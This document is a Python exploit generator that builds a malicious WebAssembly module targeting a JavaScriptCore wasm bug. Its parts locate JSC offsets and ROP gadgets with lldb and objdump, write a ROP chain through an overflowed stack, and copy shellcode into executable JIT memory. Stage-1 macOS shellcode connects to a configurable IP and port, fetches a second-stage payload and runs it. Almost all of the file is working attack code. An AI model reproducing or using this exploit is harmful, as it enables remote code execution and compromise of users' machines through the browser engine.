#!/usr/bin/env python3
import struct, sys, argparse, os, subprocess

argparser = argparse.ArgumentParser(description="generate wasm module for bug")
argparser.add_argument("-fast", action="store_true", help="for patched jsc, dont emit the 32gb stuff")
argparser.add_argument("-stkchk", action="store_true", help="emit module to find stack offset in debugger")
argparser.add_argument("-ip", help="ip to connect to for stage 2 (default 0.0.0.0)", default="0.0.0.0")
argparser.add_argument("-port", help="port to connect to for stage 2 (default 1337)", default=1337)
argparser.add_argument("-sc", action="store_true", help="reassembles shellcode instead of using current template")
argparser.add_argument("-offs", metavar="path", help="to determine offsets, path to JavaScriptCore dylib, or \"prod\" to use shared cache")
argv = argparser.parse_args()

def get_jsc_offsets_from_shared_cache():
    open("/tmp/t.c", "w").write('''
    #include <dlfcn.h>
    int main() {
        dlopen("/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore", RTLD_LAZY);
        asm volatile("int3");
        return 0;
    }
    ''')
    os.system("clang /tmp/t.c -o /tmp/t")
    lldb = subprocess.Popen(["lldb","--no-lldbinit","/tmp/t"], bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    lldb.sendline = lambda s: lldb.stdin.write(s.encode('utf-8')+b'\n')
    def m_recvuntil(s):
        s = s.encode('utf-8')
        buf = b""
        while not buf.endswith(s):
            buf += lldb.stdout.read(1)
        return buf
    lldb.recvuntil = m_recvuntil

    try:
        lldb.sendline("settings set target.x86-disassembly-flavor intel")
        lldb.sendline("r")
        lldb.recvuntil("stopped")
        lldb.sendline("ima list -h JavaScriptCore")
        lldb.recvuntil("0] ")
        jsc_base = int(lldb.recvuntil("\n")[:-1], 16)

        lldb.sendline("dis -n slow_path_wasm_out_of_line_jump_target")
        lldb.sendline("script print()")
        lldb.recvuntil("JavaScriptCore`slow_path_wasm_out_of_line_jump_target:\n")
        disas = lldb.recvuntil("\n\n").decode("utf-8")
        disas = disas.split('\n')
        disas = [disas[i] for i in range(1,len(disas)) if "call " in disas[i-1]][0]
        leak_off = int(disas.split(' <')[0].strip(), 16)-jsc_base

        lldb.sendline("dis -n WTF::MetaAllocatorHandle::dump")
        lldb.sendline("script print()")
        lldb.recvuntil("JavaScriptCore`WTF::MetaAllocatorHandle::dump:\n")
        disas = lldb.recvuntil("\n\n").decode("utf-8")
        try:
            disas = disas[disas.index('qword ptr [rdi + ')+17:]
            disas = disas[:disas.index(']')]
            hndl_raw_mem_off = int(disas, 16)
        except:
            print("WARNING: couldnt determine offset of raw mem ptr in ExecutableMemoryHandle, defaulting to 0x28")
            hndl_raw_mem_off = 0x28

        syms = {}
        lldb.sendline("dis -n JSC::ExecutableAllocator::allocate -c 1")
        lldb.sendline("script print()")
        lldb.recvuntil("JavaScriptCore`JSC::ExecutableAllocator::allocate:\n")
        syms['__ZN3JSC19ExecutableAllocator8allocateEmNS_20JITCompilationEffortE'] = int(lldb.recvuntil("\n\n").decode("utf-8").split('\n')[0].strip().split(' <')[0], 16)-jsc_base
        lldb.sendline("dis -n WTF::CString::copyBufferIfNeeded")
        lldb.sendline("script print()")
        disas = lldb.recvuntil("\n\n").decode("utf-8")
        disas = [ln for ln in disas.split('\n') if "symbol stub for: memcpy" in ln and "call " in ln][0]
        syms["_memcpy"] = int(disas.split('call ')[-1].split(';')[0].strip(), 16)-jsc_base
        lldb.sendline("dis -n initBOMCopierNew")
        lldb.sendline("script print()")
        disas = lldb.recvuntil("\n\n").decode("utf-8")
        disas = [ln for ln in disas.split('\n') if "symbol stub for: dlsym" in ln and "call " in ln][0]
        syms["_dlsym"] = int(disas.split('call ')[-1].split(';')[0].strip(), 16)-jsc_base

        gadg = {}
        gadg["ret"] = b"\xc3"
        gadg["rdi"] = b"\x5f\xc3"
        gadg["rsi"] = b"\x5e\xc3"
        gadg["rdx"] = b"\x5a\xc3"
        gadg["rcx"] = b"\x59\xc3"
        gadg["jmp_rax"] = b"\xff\xe0"
        lldb.sendline("ima dump sections JavaScriptCore")
        textsec = lldb.recvuntil("JavaScriptCore.__TEXT.__text").decode("utf-8").split('\n')[-1]
        textaddr = int(textsec.split('[')[1].split('-')[0], 16)
        textend = int(textsec.split(')')[0].split('-')[-1], 16)
        for name in gadg:
            bb = gadg[name]
            if len(bb) == 1:
                bb = "(char)0x%x"%u8(bb)
            elif len(bb) == 2:
                bb = "(short)0x%x"%u16(bb)
            else:
                raise Exception("cant handle gadget length %d"%len(bb))
            lldb.sendline("mem find -e %s 0x%x 0x%x"%(bb, textaddr, textend))
            lldb.recvuntil("mem find -e")
            lldb.recvuntil("\n")
            ln = lldb.recvuntil("\n").decode("utf-8")
            if "data found at" not in ln:
                raise Exception("couldnt find gadget for %s"%name)
            gadg[name] = int(ln.split(": ")[-1].strip(), 16)-jsc_base

        lldb.kill()
        return leak_off, hndl_raw_mem_off, gadg, syms
    except:
        lldb.kill()
        raise

def get_jsc_offsets(fpath):
    if fpath == "prod":
        return get_jsc_offsets_from_shared_cache()
    disas = os.popen("objdump -d -m --dis-symname=_slow_path_wasm_out_of_line_jump_target -x86-asm-syntax=intel --no-show-raw-insn "+fpath).read()
    disas = disas.split('\n')
    disas = [disas[i] for i in range(1,len(disas)) if "call\t" in disas[i-1]][0]
    leak_off = int(disas.split(':')[0], 16)

    disas = os.popen("objdump -d -m --dis-symname=__ZNK3WTF19MetaAllocatorHandle4dumpERNS_11PrintStreamE -x86-asm-syntax=intel --no-show-raw-insn "+fpath).read()
    try:
        disas = disas[disas.index('qword ptr [rdi + ')+17:]
        disas = disas[:disas.index(']')]
        hndl_raw_mem_off = int(disas)
    except:
        print("WARNING: couldnt determine offset of raw mem ptr in ExecutableMemoryHandle, defaulting to 0x28")
        hndl_raw_mem_off = 0x28

    sect = os.popen("otool -l "+fpath).read()
    sect = sect.split("\n")
    text_addr = int([sect[i] for i in range(1,len(sect)) if "segname __TEXT" in sect[i-1]][0].split(' ')[-1], 16)
    sect = [sect[i:i+3] for i in range(2,len(sect)-2) if "sectname __text" in sect[i-2]][0]
    text_addr += int(sect[0].split(' ')[-1], 16)
    text_sz = int(sect[1].split(' ')[-1], 16)
    text_off = int(sect[2].split(' ')[-1])
    text = open(fpath,"rb").read()[text_off:text_off+text_sz]
    gadg = {}
    gadg["ret"] = text_addr + text.index(b"\xc3")
    gadg["rdi"] = text_addr + text.index(b"\x5f\xc3")
    gadg["rsi"] = text_addr + text.index(b"\x5e\xc3")
    gadg["rdx"] = text_addr + text.index(b"\x5a\xc3")
    gadg["rcx"] = text_addr + text.index(b"\x59\xc3")
    gadg["jmp_rax"] = text_addr + text.index(b"\xff\xe0")

    rawinds = os.popen("objdump -m --indirect-symbols "+fpath).read()
    rawinds = rawinds.split("__stubs")[-1].split("symbols for")[0].split('\n')[2:-1]
    syms = {}
    for s in rawinds:
        s = s.split(' ', 2)
        syms[s[-1]] = int(s[0], 16)

    rawsyms = os.popen("nm --defined-only "+fpath).read().split('\n')[:-1]
    for s in rawsyms:
        s = s.split(' ', 2)
        syms[s[-1]] = int(s[0], 16)

    return leak_off, hndl_raw_mem_off, gadg, syms

def pleb(x):
    if x == 0:
        return b"\x00"
    out = b""
    while x != 0:
        b = x&0x7f
        x >>= 7
        if x != 0:
            b |= 0x80
        out += bytes([b])
    return out
def plebs(x):
    # signed leb128
    more = True
    neg = x < 0
    res = b""
    while more:
        b = x&0x7f
        x >>= 7
        if x==0 and b&0x40 == 0 or x==-1 and b&0x40 == 0x40:
            more = False
        else:
            b |= 0x80
        res += p8(b)
    return res
def mkImp(modname, field, pl):
    return pleb(len(modname))+modname+pleb(len(field))+field+pl
def mkExp(field, pl):
    return pleb(len(field))+field+pl
def p8(x):
    return struct.pack("<B", x)
def p16(x):
    return struct.pack("<H", x)
def p32(x):
    return struct.pack("<I", x)
def p64(x):
    return struct.pack("<Q", x)
def u8(x):
    return struct.unpack("<B", x)[0]
def u16(x):
    return struct.unpack("<H", x)[0]
def u32(x):
    return struct.unpack("<I", x)[0]
def u64(x):
    return struct.unpack("<Q", x)[0]

f64 = -4&0x7f
i64 = -2&0x7f
i32 = -1&0x7f
func = -0x20&0x7f
void = -0x40&0x7f

mod = b"\0asm"+p32(1)

nrets = 0x10000000
# this was for patched jsc to emulate bug
if argv.fast:
    nrets = 0

typ = pleb(3) # number of type entries
# format is p8(func) + pleb(nargs)+argtypes + pleb(nrets)+rettypes
typ += p8(func)+pleb(0)+pleb(0) # void
typ += p8(func)+pleb(0)+pleb(nrets)+p8(f64)*nrets
typ += p8(func)+pleb(2)+p8(i64)*2+pleb(0) # (i64, i64) -> ()
typ = p8(1)+pleb(len(typ))+typ

# format passed to mkImp for mem is p8(2)+p8(0 if no max)+pleb(initial)
imp = pleb(1)+mkImp(b"e", b"mem", p8(2)+p8(0)+pleb(1))
imp = p8(2)+pleb(len(imp))+imp

# format is pleb(num funcs)+type indices for each func
funcs = pleb(2)+pleb(2)+pleb(0)
funcs = p8(3)+pleb(len(funcs))+funcs

# format passed to mkExp is p8(0)+pleb(func idx)
exp = mkExp(b"rets", p8(0)+pleb(1))
exp = pleb(1)+exp
exp = p8(7)+pleb(len(exp))+exp

def getlocal(x):
    return b"\x20"+pleb(x)
def setlocal(x):
    return b"\x21"+pleb(x)
def teelocal(x):
    return b"\x22"+pleb(x)
def i32const(x):
    return b"\x41"+plebs(x)
def i64const(x):
    return b"\x42"+plebs(x)
def f64store(offset=0):
    return b"\x39"+pleb(0)+pleb(offset)
def i64store(offset=0):
    return b"\x37"+pleb(0)+pleb(offset)
def br(target):
    return b"\x0c"+pleb(target)
def br_if(target):
    return b"\x0d"+pleb(target)
def growmem():
    return b"\x40\x00"
def drop():
    return b"\x1a"
def ret():
    return b"\x0f"
def end():
    return b"\x0b"
def i32add():
    return b"\x6a"
def i64add():
    return b"\x7c"
def i64sub():
    return b"\x7d"
def i64popcnt():
    return b"\x7b"
def i32popcnt():
    return b"\x69"
def i64or():
    return b"\x84"
def i64and():
    return b"\x83"
def i64xor():
    return b"\x85"
def call(target):
    return b"\x10"+pleb(target)
def unreachable():
    return b"\x00"
def _if(bt=void):
    return b"\x04"+p8(bt)
def _else():
    return b"\x05"

# block type 1, unreachable, end ; pushes nrets onto stack without actually doing anything (in validation/llint gen phase)
pushrets = b"\x02\x01\x00\x0b"
voidblock = b"\x02\x00" # block type 0
brk = b"\x0c\x00" # br 0, branches out of block ignoring excess pushed stack values

code = b"" # could put code that would actually get executed here, anything after would throw an unreachable exception

if argv.stkchk:
    # use this to find the right stack offset
    # attach to proc, break on slow_path_wasm_popcountll
    # get diff of $rbp and victim thread's $rsp
    code += voidblock
    code += i64const(17)+i64popcnt()
    code += ret()
    code += end()
else:
    if argv.offs is not None:
        leak_off, hndl_raw_mem_off, gadg, syms = get_jsc_offsets(argv.offs)
        ss = "leak_off, hndl_raw_mem_off, gadg, syms = %r, %r, %r, %r"%(leak_off, hndl_raw_mem_off, gadg, syms)
        print(ss)
        open("jsc_offsets","w").write(ss)
    else:
        exec(open("jsc_offsets","r").read())
    stkoff = 0x235b8
    stkoff -= 0x200 # leave room for ropnops

    ip, port = argv.ip, argv.port
    ip = u32(b"".join(map(p8, map(int, ip.split('.')))))
    port = u16(p16(port)[::-1])
    if argv.sc:
        sc = '''
        ## save dlsym pointer
        mov r15, rdi

        ## socket(AF_INET, SOCK_STREAM, 0)
        mov eax, 0x2000061
        mov edi, 2
        mov esi, 1
        xor edx, edx
        syscall
        mov rbp, rax

        ## create addr struct
        mov eax, dword ptr [rip+ipaddr]
        mov r14, rax
        shl rax, 32
        or rax, 0x%x
        push rax
        mov eax, 0x2000062
        mov rdi, rbp
        mov rsi, rsp
        mov dl, 0x10
        syscall

        ## read sc size
        mov eax, 0x2000003
        mov dl, 8
        syscall

        ## mmap rwx
        xor edi, edi
        pop rsi
        mov dl, 7
        mov r10d, 0x1802 # MAP_PRIVATE|MAP_ANONYMOUS|MAP_JIT
        xor r8, r8
        dec r8
        xor r9, r9
        mov eax, 0x20000c5
        syscall

        ## read sc
        mov rdi, rbp
        mov rdx, rsi
        mov rsi, rax
        push rsi

        read_hdr:
        test rdx, rdx
        jz read_done
        mov eax, 0x2000003
        ## rdx gets trashed somehow in syscall???? no clue...
        push rdx
        syscall
        pop rdx
        sub rdx, rax
        add rsi, rax
        jmp read_hdr
        read_done:
        pop rsi

        ## jmp to sc, pass dlsym, socket, and server ip
        ## (need call not jmp to 16-byte align stack)
        mov rdi, r15
        xchg rsi, rbp
        mov rdx, r14
        call rbp

        ipaddr:
        '''%(2|(port<<16))
        from pwn import asm, context
        context.arch="amd64"
        sc = asm(sc)
        ss = "sc = bytes.fromhex('%s')"%sc.hex()
        print(ss)
        open("shellcode","w").write(ss)
    else:
        exec(open("shellcode","r").read())
    sc += p32(ip)
    while len(sc)%8 != 0:
        sc += b'\0'

    # we want to call slow_path_wasm_out_of_line_jump_target
    # which requires a forward jump with an offset >= 0x80
    # so we pad with some filler code (that never gets executed anyway)
    code += voidblock+i32const(1)+br_if(0)
    code += (i32const(0)+i32popcnt()+drop())*42
    code += end()

    # now loc0 is jsc code address (in slow_path_wasm_out_of_line_jump_target)
    # and loc1 is rbp of our thread stack
    code += voidblock
    # offset to jsc base
    code += getlocal(0)+i64const(leak_off)+i64sub()+setlocal(0)
    # offset to where the ropchain will be
    code += getlocal(1)+i64const(stkoff)+i64sub()+setlocal(1)
    # hop over guard page to ret address of victim thread
    code += i64const(0)*(stkoff//8-15 + 0x200//8)

    # write rop
    pop_rdi = getlocal(0)+i64const(gadg['rdi'])+i64add()+drop()*2
    pop_rsi = getlocal(0)+i64const(gadg['rsi'])+i64add()+drop()*2
    pop_rdx = getlocal(0)+i64const(gadg['rdx'])+i64add()+drop()*2
    pop_rcx = getlocal(0)+i64const(gadg['rcx'])+i64add()+drop()*2
    ropnop = getlocal(0)+i64const(gadg['ret'])+i64add()+drop()*2
    code += ropnop*(0x200//8)
    code += pop_rdi
    code += getlocal(1)+i64const(10*8)+i64add()+drop()*2
    code += pop_rdx
    code += i64const(len(sc))+i64const(0)+i64or()+drop()*2
    code += pop_rcx
    code += i64const(1)+i64const(0)+i64or()+drop()*2
    code += getlocal(0)+i64const(syms['__ZN3JSC19ExecutableAllocator8allocateEmNS_20JITCompilationEffortE'])+i64add()+drop()*2
    code += pop_rdi
    code += getlocal(1)+i64const(0x40000)+i64sub()+drop()*2
    code += pop_rsi
    code += drop()
    code += pop_rdx
    code += i64const(hndl_raw_mem_off+8)+i64const(0)+i64or()+drop()*2
    code += getlocal(0)+i64const(syms['_memcpy'])+i64add()+drop()*2
    code += pop_rdi
    code += getlocal(1)+i64const(22*8)+i64add()+drop()*2
    code += pop_rsi
    code += getlocal(1)+i64const(0x40000-hndl_raw_mem_off)+i64sub()+drop()*2
    code += pop_rdx
    code += i64const(8)+i64const(0)+i64or()+drop()*2
    code += getlocal(0)+i64const(syms['_memcpy'])+i64add()+drop()*2
    code += pop_rdi
    code += drop()
    code += pop_rsi
    code += getlocal(1)+i64const(31*8)+i64add()+drop()*2
    code += pop_rdx
    code += i64const(len(sc))+i64const(0)+i64or()+drop()*2
    code += getlocal(0)+i64const(syms['_memcpy'])+i64add()+drop()*2
    code += pop_rdi # pass dlsym to shellcode
    code += getlocal(0)+i64const(syms['_dlsym'])+i64add()+drop()*2
    code += getlocal(0)+i64const(gadg['jmp_rax'])+i64add()

    # write shellcode
    for i in range(0, len(sc), 8):
        code += drop()+i64const(u64(sc[i:i+8]))+i64or()
    code += unreachable()
    code += end()

# unconditional return, but parser doesnt know that, keeps parsing the pushrets payload and triggers overflow
code += i32const(1)+br_if(0)
if not argv.fast:
    code += (voidblock+pushrets)*16
    code += (brk+end())*16
code += ret()+end() # end

# locals, format is pleb(group count) + groups of format (pleb(count)+pleb(type))
code = pleb(0)+code

# wrapper to call func with i64 args
code2 = i64const(0)*2+call(0)+end()
# locals
code2 = pleb(0)+code2

# code section is pleb(nfuncs) + [pleb(len)+func]...
code = pleb(len(code))+code
code2 = pleb(len(code2))+code2
codes = pleb(2)+code+code2
codes = p8(10)+pleb(len(codes))+codes

mod += typ
mod += imp
mod += funcs
mod += exp
mod += codes

print("module of len 0x%x written"%len(mod))
open("rets.wasm","wb").write(mod)
